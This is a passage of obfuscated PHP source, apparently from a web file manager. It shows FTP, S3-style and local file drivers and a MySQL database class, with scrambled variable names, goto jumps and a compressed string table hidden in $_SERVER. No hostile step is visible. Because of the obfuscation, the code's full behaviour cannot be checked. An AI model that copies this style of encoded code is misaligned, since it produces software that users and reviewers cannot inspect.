$›µ£ÂÛÑ, $¼°ûéûü, !0); $–üå÷“ã = array_to_keyvalue($¼°ûéûü, $û³ˆÀä¥[32]); foreach ($›µ£ÂÛÑ as $÷æ§¼ñÕ) { if (is_string($÷æ§¼ñÕ)) { $–üå÷“ã[$÷æ§¼ñÕ] = array($û³ˆÀä¥[90] => 0); } } return $this->listAllFiles($İ™°„ÈŞ, $–üå÷“ã); } public function getContent($§µÃ³æ×) { if (!$this->_isconn()) { return !1; } $§µÃ³æ× = $this->iconvSystem($§µÃ³æ×); return $this->fileSubstr($§µÃ³æ×); } public function setContent($ïæó»Ğ‚, $Ëáù…¥ = '') { if (!$this->_isconn()) { return !1; } $Ú¤”ªÌ“ = $this->pathThis($this->iconvSystem($ïæó»Ğ‚)); $„Øà†ª² = $this->tempFile($Ú¤”ªÌ“); file_put_contents($„Øà†ª², $Ëáù…¥); $¶íüúÖÒ = $this->upload($ïæó»Ğ‚, $this->iconvApp($„Øà†ª²)); $this->tempFileRemve($„Øà†ª²); return $¶íüúÖÒ; } public function fileSubstr($¤Ç¨¡’ñ, $™¢óËüÅ = 0, $À†óÑ  = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¤Ç¨¡’ñ, $™¢óËüÅ, $À†óÑ ); } private function ftpRequest($·ìÕ¦“à, $£„Êä¦‡ = 0, $²îİ°¦ë = false) { $ ¥›æş =& $_SERVER[¤øïŠ‹²]; $·ìÕ¦“à = $ ¥›æş[8] . ltrim(str_ltrim($·ìÕ¦“à, $this->ftpPath), $ ¥›æş[8]); $·ìÕ¦“à = $this->iconvSystem($·ìÕ¦“à); $«¤·Ü‰÷ = $this->scheme . $this->host . $ ¥›æş[4] . $this->port; $ËĞ›İè– = curl_init(); curl_setopt($ËĞ›İè–, CURLOPT_URL, $«¤·Ü‰÷ . $this->pathEncode($·ìÕ¦“à)); curl_setopt($ËĞ›İè–, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($²îİ°¦ë) { $øÁı„Ä = $£„Êä¦‡ + $²îİ°¦ë - 1; curl_setopt($ËĞ›İè–, CURLOPT_RANGE, "{$£„Êä¦‡}\55{$øÁı„Ä}"); } curl_setopt($ËĞ›İè–, CURLOPT_RETURNTRANSFER, 1); $ªè¢ªÒÔ = curl_exec($ËĞ›İè–); curl_close($ËĞ›İè–); return $ªè¢ªÒÔ; } public function upload($¾¹ñö®, $­¸™Œ‰¡, $¸†ŞÍ¾¹ = false, $¦Ã¼Æ× = REPEAT_REPLACE) { if (!$­¸™Œ‰¡ || !@file_exists($­¸™Œ‰¡)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¾¹ñö®))) { return !1; } $¾¹ñö® = $this->iconvSystem($¾¹ñö®); $­¸™Œ‰¡ = $this->iconvSystem($­¸™Œ‰¡); $™ßæˆˆ‚ = ftp_nb_put($this->connect, $¾¹ñö®, $­¸™Œ‰¡, FTP_BINARY); while ($™ßæˆˆ‚ == FTP_MOREDATA) { $™ßæˆˆ‚ = ftp_nb_continue($this->connect); } if ($™ßæˆˆ‚ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } return $this->getPathOuter($¾¹ñö®); } public function download($ğÛÁ¢¢È, $ÁßŞ®¥ş = '') { if (!$this->_isconn()) { return !1; } $šßçƒß¢ = $this->pathFather($ÁßŞ®¥ş); if (!IO::mkdir($šßçƒß¢)) { return !1; } $ğÛÁ¢¢È = $this->iconvSystem($ğÛÁ¢¢È); $ÁßŞ®¥ş = $this->iconvSystem($ÁßŞ®¥ş); $ü²µ¶¼Á = ftp_nb_get($this->connect, $ÁßŞ®¥ş, $ğÛÁ¢¢È, FTP_BINARY); while ($ü²µ¶¼Á == FTP_MOREDATA) { $ü²µ¶¼Á = ftp_nb_continue($this->connect); } if ($ü²µ¶¼Á != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } return $this->iconvApp($ÁßŞ®¥ş); } public function exist($Û„òş¶Ã) { return $this->isFile($Û„òş¶Ã) || $this->isFolder($Û„òş¶Ã); } public function isFile($Œ€Ú¶Èˆ) { return !$this->isFolder($Œ€Ú¶Èˆ) && $this->objectMeta($Œ€Ú¶Èˆ); } public function isFolder($ƒ ÙÌ) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][190], $ƒ ÙÌ); } protected function objectMeta($ÕÊ»¶Ú) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][192], $ÕÊ»¶Ú); } protected function _objectMeta($ÄÓ¸µ¦) { $«ì÷µø¥ =& $_SERVER[¤øïŠ‹²]; if ($ÄÓ¸µ¦ == $«ì÷µø¥[12] || $ÄÓ¸µ¦ == $«ì÷µø¥[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÄÓ¸µ¦ = $this->iconvSystem($ÄÓ¸µ¦); $–¬İÎĞ = array($«ì÷µø¥[32] => $this->iconvApp($ÄÓ¸µ¦), $«ì÷µø¥[33] => $«ì÷µø¥[243], $«ì÷µø¥[90] => 0); $»Ñ»ñÅ = @ftp_size($this->connect, $ÄÓ¸µ¦); if ($»Ñ»ñÅ != -1) { $–¬İÎĞ[$«ì÷µø¥[90]] = $»Ñ»ñÅ; } else { $äÜÎ‡“ = @ftp_chdir($this->connect, $ÄÓ¸µ¦); if (!$äÜÎ‡“) { return !1; } @ftp_chdir($this->connect, $«ì÷µø¥[8]); $–¬İÎĞ[$«ì÷µø¥[33]] = $«ì÷µø¥[89]; } return $–¬İÎĞ; } protected function _isFolder($ãÌƒ³) { $ó‘ó§ =& $_SERVER[¤øïŠ‹²]; if ($ãÌƒ³ == $ó‘ó§[12] || $ãÌƒ³ == $ó‘ó§[8]) { return !0; } $Š¶´„‡ = $this->_objectMeta($ãÌƒ³); return isset($Š¶´„‡[$ó‘ó§[33]]) && $Š¶´„‡[$ó‘ó§[33]] == $ó‘ó§[89] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¬à‰×¬—) { parent::__construct($¬à‰×¬—); $this->setSignVersion($_SERVER[¤øïŠ‹²][260]); } public function uploadLink($àõêĞå, $ïÄøğÊØ = 0) { $Îö³ˆÆÉ =& $_SERVER[¤øïŠ‹²]; if ($this->isUploadServer()) { return; } $–’—Ê¤± = $this->getType(); if (!in_array($–’—Ê¤±, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ß¹™Ò›Ú = (!$ïÄøğÊØ ? 1 : ceil($ïÄøğÊØ / pow(1024, 3))) * 3600 * 4; $ªß¶ş›” = $this->uploadMultiData($àõêĞå, $ß¹™Ò›Ú); if ($ªß¶ş›”) { $ªß¶ş›”[$Îö³ˆÆÉ[106]] = $àõêĞå; $ªß¶ş›”[$Îö³ˆÆÉ[107]] = $–’—Ê¤±; } return $ªß¶ş›”; } public function fileOutImage($ıœ·¬‰•, $Ôåòİƒ¤ = 250) { if ($this->size($ıœ·¬‰•) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ıœ·¬‰•, $Ôåòİƒ¤); } $³²©•ÉÆ = $this->link($ıœ·¬‰•); $³²©•ÉÆ .= $_SERVER[¤øïŠ‹²][1610] . $Ôåòİƒ¤; $this->fileOutLink($³²©•ÉÆ); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($®…—óĞ¢) { if (substr($®…—óĞ¢, 0, 2) == $_SERVER[¤øïŠ‹²][1472]) { $®…—óĞ¢ = BASIC_PATH . substr($®…—óĞ¢, 2); } return $®…—óĞ¢; } public function iconvApp($…Âò¸£) { $–‰çõ“– =& $_SERVER[¤øïŠ‹²]; global $config; return $this->iconvTo($…Âò¸£, $config[$–‰çõ“–[1596]], $config[$–‰çõ“–[1595]]); } public function iconvSystem($Çâ÷›¬Ù) { $È«¹Úı« =& $_SERVER[¤øïŠ‹²]; global $config; return $this->iconvTo($Çâ÷›¬Ù, $config[$È«¹Úı«[1595]], $config[$È«¹Úı«[1596]]); } public function getPathOuter($é€…ú‰) { $ÆéÅœÁñ =& $_SERVER[¤øïŠ‹²]; $ù®«½ÙĞ = $this->iconvApp($this->pathBase); $é€…ú‰ = $this->iconvApp($é€…ú‰); if (substr($ù®«½ÙĞ, 0, 2) == $ÆéÅœÁñ[1472]) { $ù®«½ÙĞ = BASIC_PATH . substr($ù®«½ÙĞ, 2); } if (substr($é€…ú‰, 0, 2) == $ÆéÅœÁñ[1472]) { $é€…ú‰ = BASIC_PATH . substr($é€…ú‰, 2); } $ù®«½ÙĞ = KodIO::clear($ù®«½ÙĞ); $é€…ú‰ = KodIO::clear($é€…ú‰); $é€…ú‰ = substr($é€…ú‰, strlen($ù®«½ÙĞ)); if (empty($this->pathDriver)) { return $é€…ú‰; } return $this->pathDriver . $ÆéÅœÁñ[8] . ltrim($é€…ú‰, $ÆéÅœÁñ[8]); } public function mkfile($šæ’Ø¸ì, $œáíëÎç = '', $Ûø¬¼’¼ = REPEAT_RENAME) { $šæ’Ø¸ì = $this->iconvSystem($šæ’Ø¸ì); @touch($šæ’Ø¸ì); if ($œáíëÎç) { file_put_contents($šæ’Ø¸ì, $œáíëÎç); } @chmod($šæ’Ø¸ì, $this->pathAuth); if (is_file($šæ’Ø¸ì)) { return $this->getPathOuter($šæ’Ø¸ì); } $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } public function mkdir($ñÑßé²¼, $ş¢”ã¾œ = REPEAT_SKIP) { $ñÑßé²¼ = $this->iconvSystem($ñÑßé²¼); if (is_dir($ñÑßé²¼)) { return $this->getPathOuter($ñÑßé²¼); } @mkdir($ñÑßé²¼, $this->pathAuth, !0); @chmod($ñÑßé²¼, $this->pathAuth); if (is_dir($ñÑßé²¼)) { return $this->getPathOuter($ñÑßé²¼); } $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } public function copyFile($¾©İó«, $à¶³àä) { $this->mkdir($this->pathFather($à¶³àä)); $¾©İó« = $this->iconvSystem($¾©İó«); $à¶³àä = $this->iconvSystem($à¶³àä); $®×®°Ââ = copy_64($¾©İó«, $à¶³àä); @chmod($à¶³àä, $this->pathAuth); if ($®×®°Ââ) { return $this->getPathOuter($à¶³àä); } $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } public function moveFile($¼¿Éë¨ñ, $ºÅØËşÙ) { $this->mkdir($this->pathFather($ºÅØËşÙ)); $¼¿Éë¨ñ = $this->iconvSystem($¼¿Éë¨ñ); $ºÅØËşÙ = $this->iconvSystem($ºÅØËşÙ); $È¢¬Û€İ = intval(@rename($¼¿Éë¨ñ, $ºÅØËşÙ)); if (!$È¢¬Û€İ) { if ($È¢¬Û€İ = intval(@copy_64($¼¿Éë¨ñ, $ºÅØËşÙ))) { @unlink($¼¿Éë¨ñ); } } @chmod($ºÅØËşÙ, $this->pathAuth); if ($È¢¬Û€İ) { return $this->getPathOuter($ºÅØËşÙ); } $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } public function movePath($Ò‰¦„©², $†ÕÖºŞ, $¬µ°¿é¿ = false) { $ôóş›Şì =& $_SERVER[¤øïŠ‹²]; $Ò‰¦„©² = $this->iconvSystem($Ò‰¦„©²); $†ÕÖºŞ = $this->iconvSystem($†ÕÖºŞ); $•ÄË‚Ş = rtrim($†ÕÖºŞ, $ôóş›Şì[8]) . $ôóş›Şì[8] . ($¬µ°¿é¿ ? $¬µ°¿é¿ : get_path_this($Ò‰¦„©²)); if (file_exists($•ÄË‚Ş)) { return !1; } $—œÊÖÊµ = intval(@rename($Ò‰¦„©², $•ÄË‚Ş)); $—œÊÖÊµ = file_exists($•ÄË‚Ş); if ($—œÊÖÊµ) { return $this->getPathOuter($•ÄË‚Ş); } $this->writeLog(__FUNCTION__ . $ôóş›Şì[1607], !0); return !1; } public function delFile($Íƒ‘Ó¨„) { $Íƒ‘Ó¨„ = $this->iconvSystem($Íƒ‘Ó¨„); if (!@unlink($Íƒ‘Ó¨„)) { @chmod($Íƒ‘Ó¨„, $this->pathAuth); if (@unlink($Íƒ‘Ó¨„)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } return !0; } public function delFolder($®¹ÁôÙ—) { $°›ñîõÈ =& $_SERVER[¤øïŠ‹²]; $®¹ÁôÙ— = $this->iconvSystem($®¹ÁôÙ—); if (!is_dir($®¹ÁôÙ—)) { return !0; } if (!($ŸŠÄÆ— = opendir($®¹ÁôÙ—))) { return !1; } while (($·Şõû’ = readdir($ŸŠÄÆ—)) !== !1) { if ($·Şõû’ == $°›ñîõÈ[10] || $·Şõû’ == $°›ñîõÈ[1417]) { continue; } $Ëìı‹éî = $®¹ÁôÙ— . $°›ñîõÈ[8] . $·Şõû’; if (is_file($Ëìı‹éî) || is_link($Ëìı‹éî)) { if (!unlink($Ëìı‹éî)) { chmod($Ëìı‹éî, $this->pathAuth); if (!unlink($Ëìı‹éî)) { return !1; } } } else { if (is_dir($Ëìı‹éî)) { chmod($Ëìı‹éî, $this->pathAuth); $Ëìı‹éî = $this->iconvApp($Ëìı‹éî); if (!$this->delFolder($Ëìı‹éî)) { return !1; } } } } closedir($ŸŠÄÆ—); return rmdir($®¹ÁôÙ—); } public function rename($‡Û‚óƒ, $Ÿ‚¥·‚î) { $° ·èÁ =& $_SERVER[¤øïŠ‹²]; $ËË×Ú‚à = $this->fileNameAuto($this->pathFather($‡Û‚óƒ), $Ÿ‚¥·‚î); $ËË×Ú‚à = $this->iconvSystem($ËË×Ú‚à); $‡Û‚óƒ = $this->iconvSystem($‡Û‚óƒ); $›£¡ÅÉ² = $this->pathFather($‡Û‚óƒ); $ù¿¼à¡à = rtrim($›£¡ÅÉ², $° ·èÁ[8]) . $° ·èÁ[8] . $ËË×Ú‚à; $Ô–¼áŞ¼ = @rename($‡Û‚óƒ, $ù¿¼à¡à); $ù¿¼à¡à = $this->iconvApp($ù¿¼à¡à); if ($Ô–¼áŞ¼) { return $this->getPathOuter($ù¿¼à¡à); } $this->writeLog(__FUNCTION__ . $° ·èÁ[1607], !0); return !1; } public function size($µˆ·û…¯) { $µˆ·û…¯ = $this->iconvSystem($µˆ·û…¯); return filesize_64($µˆ·û…¯); } public function info($áËõ¿³) { $áËõ¿³ = $this->iconvSystem($áËõ¿³); if ($this->isFolder($áËõ¿³)) { return $this->folderInfo($áËõ¿³); } else { if ($this->isFile($áËõ¿³)) { return $this->fileInfo($áËõ¿³); } } return !1; } protected function infoChildren($Ó“Ï¦Î, &$š…¢Á–‡, $í½ûÙÁ = true) { $Íª°îƒ =& $_SERVER[¤øïŠ‹²]; check_abort_echo(); $Ó“Ï¦Î = rtrim($Ó“Ï¦Î, $Íª°îƒ[8]) . $Íª°îƒ[8]; if ($í½ûÙÁ) { $Ó“Ï¦Î = $this->iconvSystem($Ó“Ï¦Î); } if (!($õ®±Ó´ë = @opendir($Ó“Ï¦Î))) { return; } while (($Ÿ²çŠÚ­ = readdir($õ®±Ó´ë)) !== !1) { if ($Ÿ²çŠÚ­ == $Íª°îƒ[10] || $Ÿ²çŠÚ­ == $Íª°îƒ[1417]) { continue; } $øÖ”ƒ’« = $Ó“Ï¦Î . $Ÿ²çŠÚ­; if (is_file($øÖ”ƒ’«) || is_link($øÖ”ƒ’«)) { $š…¢Á–‡[$Íª°îƒ[91]]++; $š…¢Á–‡[$Íª°îƒ[90]] += filesize_64($øÖ”ƒ’«); } else { if (is_dir($øÖ”ƒ’«)) { $š…¢Á–‡[$Íª°îƒ[92]]++; $this->infoChildren($øÖ”ƒ’«, $š…¢Á–‡, !1); } } } closedir($õ®±Ó´ë); } private function folderInfo($ìã˜Çî, $Õ™“Åî… = false) { $ˆ¨ê—Æò =& $_SERVER[¤øïŠ‹²]; $ìã˜Çî = rtrim($ìã˜Çî, $ˆ¨ê—Æò[8]) . $ˆ¨ê—Æò[8]; $ò€Å×é = $this->iconvApp($this->pathThis($ìã˜Çî)); if ($Õ™“Åî…) { return array($ˆ¨ê—Æò[32] => $ò€Å×é, $ˆ¨ê—Æò[98] => $this->getPathOuter($ìã˜Çî), $ˆ¨ê—Æò[33] => $ˆ¨ê—Æò[89]); } $Èšà„ÅÇ = array($ˆ¨ê—Æò[32] => $ò€Å×é, $ˆ¨ê—Æò[98] => $this->getPathOuter($ìã˜Çî), $ˆ¨ê—Æò[33] => $ˆ¨ê—Æò[89], $ˆ¨ê—Æò[244] => @filectime($ìã˜Çî), $ˆ¨ê—Æò[99] => @filemtime($ìã˜Çî), $ˆ¨ê—Æò[1611] => @fileatime($ìã˜Çî), $ˆ¨ê—Æò[1612] => is_readable($ìã˜Çî), $ˆ¨ê—Æò[1613] => is_writable($ìã˜Çî), $ˆ¨ê—Æò[1614] => get_mode($ìã˜Çî)); return $Èšà„ÅÇ; } private function fileInfo($èï„Åšº, $Ğ½¾ÈïÒ = false) { $ã³ğåşú =& $_SERVER[¤øïŠ‹²]; $³Ö­¨åÆ = $this->iconvApp($this->pathThis($èï„Åšº)); if ($Ğ½¾ÈïÒ) { return array($ã³ğåşú[32] => $³Ö­¨åÆ, $ã³ğåşú[98] => $this->getPathOuter($èï„Åšº), $ã³ğåşú[33] => $ã³ğåşú[243], $ã³ğåşú[90] => $this->size($èï„Åšº), $ã³ğåşú[179] => $this->ext($³Ö­¨åÆ)); } $ğ¢ÀÒ¤ = array($ã³ğåşú[32] => $³Ö­¨åÆ, $ã³ğåşú[98] => $this->getPathOuter($èï„Åšº), $ã³ğåşú[33] => $ã³ğåşú[243], $ã³ğåşú[244] => @filectime($èï„Åšº), $ã³ğåşú[99] => @filemtime($èï„Åšº), $ã³ğåşú[1611] => @fileatime($èï„Åšº), $ã³ğåşú[90] => $this->size($èï„Åšº), $ã³ğåşú[179] => $this->ext($³Ö­¨åÆ), $ã³ğåşú[1612] => is_readable($èï„Åšº), $ã³ğåşú[1613] => is_writable($èï„Åšº), $ã³ğåşú[1614] => get_mode($èï„Åšº)); return $ğ¢ÀÒ¤; } public function exist($ÇşîÜ©Š) { $ÇşîÜ©Š = $this->iconvSystem($ÇşîÜ©Š); return @file_exists($ÇşîÜ©Š); } public function isFile($ª½ä Ì¸) { $ª½ä Ì¸ = $this->iconvSystem($ª½ä Ì¸); return @is_file($ª½ä Ì¸); } public function isFolder($á¢Êî) { $á¢Êî = $this->iconvSystem($á¢Êî); return @is_dir($á¢Êî); } public function listPath($€âÀë¡, $ñÛ¢×‹ = false) { $ÆÌÏ–ôï =& $_SERVER[¤øïŠ‹²]; $€âÀë¡ = $this->iconvSystem($€âÀë¡); $€âÀë¡ = rtrim($€âÀë¡, $ÆÌÏ–ôï[8]) . $ÆÌÏ–ôï[8]; $Í†ä‡À = array($ÆÌÏ–ôï[96] => array(), $ÆÌÏ–ôï[97] => array()); if (!($´ï¼ú·‰ = @opendir($€âÀë¡))) { return $Í†ä‡À; } while (($ğ…÷Ü² = readdir($´ï¼ú·‰)) !== !1) { if ($ğ…÷Ü² == $ÆÌÏ–ôï[10] || $ğ…÷Ü² == $ÆÌÏ–ôï[1417]) { continue; } $›¢‚¤˜˜ = $€âÀë¡ . $ğ…÷Ü²; if (is_file($›¢‚¤˜˜)) { $Í†ä‡À[$ÆÌÏ–ôï[97]][] = $this->fileInfo($›¢‚¤˜˜, $ñÛ¢×‹); } else { $Í†ä‡À[$ÆÌÏ–ôï[96]][] = $this->folderInfo($›¢‚¤˜˜, $ñÛ¢×‹); } } closedir($´ï¼ú·‰); return $Í†ä‡À; } public function listAll($„òÌ‰½×, &$öÕŸ«Éœ = array()) { $±€¨° =& $_SERVER[¤øïŠ‹²]; $„òÌ‰½× = $this->iconvSystem($„òÌ‰½×); $„òÌ‰½× = rtrim($„òÌ‰½×, $±€¨°[8]) . $±€¨°[8]; if (!($’ı¬úşâ = @opendir($„òÌ‰½×))) { return $öÕŸ«Éœ; } while (($Ñõä†¹Ó = readdir($’ı¬úşâ)) !== !1) { if ($Ñõä†¹Ó == $±€¨°[10] || $Ñõä†¹Ó == $±€¨°[1417]) { continue; } $¯ßÎ°Íı = $„òÌ‰½× . $Ñõä†¹Ó; $ÉâÛÑÚ = is_dir($¯ßÎ°Íı) && !is_link($¯ßÎ°Íı) ? 1 : 0; $¯ßÎ°Íı = $ÉâÛÑÚ ? $¯ßÎ°Íı . $±€¨°[8] : $¯ßÎ°Íı; $öÕŸ«Éœ[] = array($±€¨°[98] => $this->getPathOuter($¯ßÎ°Íı), $±€¨°[89] => $ÉâÛÑÚ, $±€¨°[99] => intval(@filemtime($¯ßÎ°Íı)), $±€¨°[90] => $ÉâÛÑÚ ? 0 : intval($this->size($¯ßÎ°Íı))); if ($ÉâÛÑÚ) { $this->listAll($¯ßÎ°Íı, $öÕŸ«Éœ); } } closedir($’ı¬úşâ); return $öÕŸ«Éœ; } public function has($ĞıÛĞáÏ, $¹ÅÑöšß = false, $¸úõÌÍè = true) { $¥½ô×“ã =& $_SERVER[¤øïŠ‹²]; $ĞıÛĞáÏ = $this->iconvSystem($ĞıÛĞáÏ); $ĞıÛĞáÏ = rtrim($ĞıÛĞáÏ, $¥½ô×“ã[8]) . $¥½ô×“ã[8]; if (!($Ï£Ë¸°ß = @opendir($ĞıÛĞáÏ))) { return !1; } $­¢…ÂóØ = 0; $³şÎÔ¼ = 0; $Ä¢£­ÁŸ = 0; while (($”§˜à¶ = readdir($Ï£Ë¸°ß)) !== !1) { if ($”§˜à¶ == $¥½ô×“ã[10] || $”§˜à¶ == $¥½ô×“ã[1417]) { continue; } $£¼Ïë» = $ĞıÛĞáÏ . $”§˜à¶; if ($¹ÅÑöšß) { $Ä¢£­ÁŸ++; if (@is_file($£¼Ïë»)) { $­¢…ÂóØ++; } else { $³şÎÔ¼++; } if ($Ä¢£­ÁŸ > 10000) { break; } continue; } if ($¸úõÌÍè) { if (@is_file($£¼Ïë»)) { return !0; } } else { if (@is_dir($£¼Ïë» . $¥½ô×“ã[8])) { return !0; } } } closedir($Ï£Ë¸°ß); if ($¹ÅÑöšß) { return array($¥½ô×“ã[252] => $­¢…ÂóØ, $¥½ô×“ã[253] => $³şÎÔ¼); } return !1; } public function hashSimple($ïã«’£í) { $ñ¢ø…™ =& $_SERVER[¤øïŠ‹²]; if (!$ïã«’£í) { return md5($ñ¢ø…™[12]); } $ïã«’£í = $this->iconvSystem($ïã«’£í); $àŞõƒßë = $this->size($ïã«’£í); $ÔŒİ–ìÆ = 200; $ÙÈ£À«Ú = 50; if ($àŞõƒßë <= $ÔŒİ–ìÆ * $ÙÈ£À«Ú) { return $this->hashMd5($ïã«’£í) . $àŞõƒßë; } $Ä¼Ôú¯¶ = $ñ¢ø…™[12]; $è—ÍÄÃ† = intval($àŞõƒßë / $ÙÈ£À«Ú); $”Ø™‰¾‹ = fopen($ïã«’£í, $ñ¢ø…™[1615]); if (!$”Ø™‰¾‹) { return $Ä¼Ôú¯¶; } for ($¶üº‚ƒˆ = 0; $¶üº‚ƒˆ < $ÙÈ£À«Ú; $¶üº‚ƒˆ++) { fseek_64($”Ø™‰¾‹, $è—ÍÄÃ† * $¶üº‚ƒˆ); $Ä¼Ôú¯¶ .= fread($”Ø™‰¾‹, $ÔŒİ–ìÆ); } fseek_64($”Ø™‰¾‹, $àŞõƒßë - $ÔŒİ–ìÆ); $Ä¼Ôú¯¶ .= fread($”Ø™‰¾‹, $ÔŒİ–ìÆ); fclose($”Ø™‰¾‹); return md5($Ä¼Ôú¯¶) . $àŞõƒßë; } public function getContent($Àí…óò) { $Àí…óò = $this->iconvSystem($Àí…óò); return file_get_contents($Àí…óò); } public function setContent($ë…İÍÔğ, $¸™®ìóÅ = '') { $ë…İÍÔğ = $this->iconvSystem($ë…İÍÔğ); $ÂÏ³ÓÕ‹ = @file_put_contents($ë…İÍÔğ, $¸™®ìóÅ, LOCK_EX); if (!$ÂÏ³ÓÕ‹) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); } clearstatcache(); @chmod($ë…İÍÔğ, $this->pathAuth); return $ÂÏ³ÓÕ‹ === !1 ? !1 : !0; } public function fileSubstr($Ã†ÏÍˆá, $Ø‰ÇöŒ§ = 0, $“ıÖ˜Ğ³ = false) { $ Ïš³å€ =& $_SERVER[¤øïŠ‹²]; $Ã†ÏÍˆá = $this->iconvSystem($Ã†ÏÍˆá); if ($“ıÖ˜Ğ³ === !1) { $“ıÖ˜Ğ³ = $this->size($Ã†ÏÍˆá); } if ($“ıÖ˜Ğ³ <= 0) { return $ Ïš³å€[12]; } $ó¡Áºµµ = fopen($Ã†ÏÍˆá, $ Ïš³å€[1615]); if (!$ó¡Áºµµ) { return !1; } fseek_64($ó¡Áºµµ, $Ø‰ÇöŒ§); $±Ä“Åó‡ = fread($ó¡Áºµµ, $“ıÖ˜Ğ³); fclose($ó¡Áºµµ); if (!$±Ä“Åó‡) { $this->writeLog(__FUNCTION__ . $ Ïš³å€[1607], !0); } return $±Ä“Åó‡; } public function upload($‹•·•¼€, $ö¢ç²¿±, $—×ÁëÍ€ = false, $í‚«şøå = REPEAT_REPLACE) { if (!$ö¢ç²¿± || !@file_exists($ö¢ç²¿±)) { return !1; } if ($—×ÁëÍ€) { return $this->moveFile($ö¢ç²¿±, $‹•·•¼€); } return $this->copyFile($ö¢ç²¿±, $‹•·•¼€); } public function setModifyTime($¡ÓÚåÁ, $İÅ–ù¯£ = '') { @touch($¡ÓÚåÁ, intval($İÅ–ù¯£)); } public function download($Ğ°¯»ƒ, $ÅĞàíùâ) { return $this->iconvSystem($Ğ°¯»ƒ); } } goto CØ–ßÁ¡Ñè; dãÕ°•º°: define($_SERVER[¤øïŠ‹²][0], $_SERVER[¤øïŠ‹²][1]); $_SERVER[¡ŞãµÈ] = explode($_SERVER[¤øïŠ‹²][2], gzinflate(substr($_SERVER[¤øïŠ‹²][3], 10, -8))); function binCheckEq($î–É½˜ı, $ß¡Æ…ç¿) { return $î–É½˜ı == $ß¡Æ…ç¿; } goto f¢ÈÛãîÓ; d‘ó«¹…¢à: class DbMysql extends Db { public function __construct($¹›‡Í§¥ = '') { $çİèçÌã =& $_SERVER[¤øïŠ‹²]; if (!extension_loaded($çİèçÌã[905])) { think_exception(think_lang($çİèçÌã[14]) . $çİèçÌã[998]); } if (!empty($¹›‡Í§¥)) { $this->config = $¹›‡Í§¥; if (empty($this->config[$çİèçÌã[17]])) { $this->config[$çİèçÌã[17]] = $çİèçÌã[12]; } } } public function connect($Ëı§Êò = '', $šäŞ²Ñù = 0, $ØßˆĞ  = false) { $Óáå†Œ =& $_SERVER[¤øïŠ‹²]; if (!isset($this->linkID[$šäŞ²Ñù])) { if (empty($Ëı§Êò)) { $Ëı§Êò = $this->config; } $ˆ”·àîš = $Ëı§Êò[$Óáå†Œ[999]] . ($Ëı§Êò[$Óáå†Œ[1000]] ? "\x3a{$Ëı§Êò[$Óáå†Œ[1000]]}" : $Óáå†Œ[12]); $ŸÅ ùÚà = !empty($Ëı§Êò[$Óáå†Œ[17]][$Óáå†Œ[18]]) ? $Ëı§Êò[$Óáå†Œ[17]][$Óáå†Œ[18]] : $this->pconnect; if ($ŸÅ ùÚà) { $this->linkID[$šäŞ²Ñù] = mysql_pconnect($ˆ”·àîš, $Ëı§Êò[$Óáå†Œ[1001]], $Ëı§Êò[$Óáå†Œ[1002]], 131072); } else { $this->linkID[$šäŞ²Ñù] = mysql_connect($ˆ”·àîš, $Ëı§Êò[$Óáå†Œ[1001]], $Ëı§Êò[$Óáå†Œ[1002]], !0, 131072); } if (!$this->linkID[$šäŞ²Ñù] || !empty($Ëı§Êò[$Óáå†Œ[21]]) && !mysql_select_db($Ëı§Êò[$Óáå†Œ[21]], $this->linkID[$šäŞ²Ñù])) { think_exception(mysql_error()); } $ÀöÃÀèÑ = mysql_get_server_info($this->linkID[$šäŞ²Ñù]); mysql_query($Óáå†Œ[1003] . think_config($Óáå†Œ[1004]) . $Óáå†Œ[68], $this->linkID[$šäŞ²Ñù]); if ($ÀöÃÀèÑ > $Óáå†Œ[1005]) { mysql_query($Óáå†Œ[1006], $this->linkID[$šäŞ²Ñù]); } $this->connected = !0; if (1 != think_config($Óáå†Œ[22])) { unset($this->config); } } return $this->linkID[$šäŞ²Ñù]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¥»®Ãôæ) { $šªĞø‰Ù =& $_SERVER[¤øïŠ‹²]; if (0 === stripos($¥»®Ãôæ, $šªĞø‰Ù[354])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¥»®Ãôæ; if ($this->queryID) { $this->free(); } think_action_status($šªĞø‰Ù[23], 1); think_status($šªĞø‰Ù[24]); $this->queryID = mysql_query($¥»®Ãôæ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($‰×ïÓ«Ş) { $ÕæŞœ¤¶ =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‰×ïÓ«Ş; if ($this->queryID) { $this->free(); } think_action_status($ÕæŞœ¤¶[25], 1); think_status($ÕæŞœ¤¶[24]); $¿·à×•˜ = mysql_query($‰×ïÓ«Ş, $this->_linkID); $this->debug(); if (!1 === $¿·à×•˜) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } 